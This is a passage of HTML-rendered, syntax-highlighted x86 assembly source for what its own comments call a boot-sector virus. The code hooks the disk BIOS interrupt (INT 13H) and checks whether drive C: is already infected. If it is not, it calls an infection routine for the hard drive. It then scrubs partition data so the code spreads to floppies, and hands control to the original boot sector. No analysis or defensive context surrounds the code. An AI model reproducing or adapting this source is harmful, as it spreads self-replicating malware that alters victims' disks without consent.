        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;at 0000:7C00</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc5">SET_SEGMENTS</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;change segments around a bit</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0">               </span><span class="sc1">;set up the stack for the virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                              </span><span class="sc1">;and also the es register</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">INSTALL_INT13H</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;now hook the Disk BIOS int</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">13H</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">;save the old int 13H vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OLD_13H</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_13H</span><span class="sc0">               </span><span class="sc1">;and set up new interrupt 13H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">13H</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">;which everybody will have to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;use from now on</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">CHECK_DRIVE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                              </span><span class="sc1">;set ds to point here now</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">],</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">;if booting from a hard drive,</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DONE</span><span class="sc0">                            </span><span class="sc1">;nothing else needed at boot</span><span class="sc0">

</span><span class="sc5">FLOPPY_DISK</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;if loading from a floppy drive,</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IS_HARD_THERE</span><span class="sc0">                   </span><span class="sc1">;see if a hard disk exists here</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DONE</span><span class="sc0">                            </span><span class="sc1">;no hard disk, all done booting</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;else load boot sector from C:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;into SCRATCHBUF</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IS_VBS</span><span class="sc0">                          </span><span class="sc1">;and see if C: is infected</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DONE</span><span class="sc0">                            </span><span class="sc1">;yes, all done booting</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT_HARD</span><span class="sc0">                     </span><span class="sc1">;else go infect hard drive C:</span><span class="sc0">

</span><span class="sc5">DONE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PART</span><span class="sc0">                  </span><span class="sc1">;clean partition data out of</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PART</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;memory image of boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">                          </span><span class="sc1">;so it doesn't get spread to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;floppies when we infect them</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;now go execute old boot sector</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;at 0000:7C00</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">


        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">7DBEH</span><span class="sc0">

</span><span class="sc5">PART</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">40H</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;partition table goes here</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">7DFEH</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">55H</span><span class="sc4">,</span><span class="sc2">0AAH</span><span class="sc0">                        </span><span class="sc1">;boot sector ID goes here</span><span class="sc0">

</span><span class="sc5">ENDCODE</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;label for the end of boot sec</span><span class="sc0">

</span><span class="sc5">COMSEG</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span></div></body>
</html>
